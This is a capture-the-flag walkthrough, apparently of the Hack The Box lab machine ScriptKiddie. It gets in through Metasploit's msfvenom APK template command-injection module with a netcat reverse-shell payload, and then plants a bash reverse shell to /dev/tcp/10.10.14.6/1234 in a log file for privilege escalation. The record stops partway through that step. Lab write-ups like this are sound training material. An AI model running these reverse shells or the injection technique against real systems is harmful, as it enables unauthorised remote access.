@@ -1,0 +1,70 @@
+I start off with an nmap scan:
+└─# nmap -sC -sV -A 10.10.10.226
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
+|_http-title: k1d'5 h4ck3r t00l5
+
+I visit http://10.10.10.226:5000/ and see different options to try for exploits like Command Injection, RFI, LFI, File Upload Vulnerability.
+On metasploit : msf6 > search template
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options
+Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
+  Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.apk          yes       The APK file name
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit
+
+[+] msf.apk stored at /root/.msf4/local/msf.apk
+
+I then proceed to upload the msf.apk on the site and wait for a callback on port 4444.
+kid@scriptkiddie:~$ cat user.txt
+cat user.txt
+9ba7544134ef7c067d406b84b791d48b
+==================Priv Escalation=====================
+kid@scriptkiddie:~/logs$ ls
+ls
+hackers
+kid@scriptkiddie:~/logs$ ls -al
+ls -al
+total 8
+drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
+drwxr-xr-x 11 kid kid 4096 May 22 02:53 ..
+-rw-rw-r--  1 kid pwn    0 Feb  3 11:46 hackers
+kid@scriptkiddie:~/logs$ cat hackers
+cat hackers
+kid@scriptkiddie:~/logs$ echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1' " > hackers.sh
+<-i >& /dev/tcp/10.10.14.6/1234 0>&1' " > hackers.sh
+kid@scriptkiddie:~/logs$ cat hackers.sh
+cat hackers.sh
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1' 
+kid@scriptkiddie:~/logs$ mv hackers.sh hackers
+kid@scriptkiddie:~/logs$ cat hackers
+cat hackers
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1' 
+kid@scriptkiddie:~/logs$ ls -al
+ls -al
+total 12
+drwxrwxrwx  2 kid kid 4096 May 22 03:56 .
+drwxr-xr-x 11 kid kid 4096 May 22 02:53 ..
+-rwxrwxr-x  1 kid pwn   57 May 22 03:55 hackers
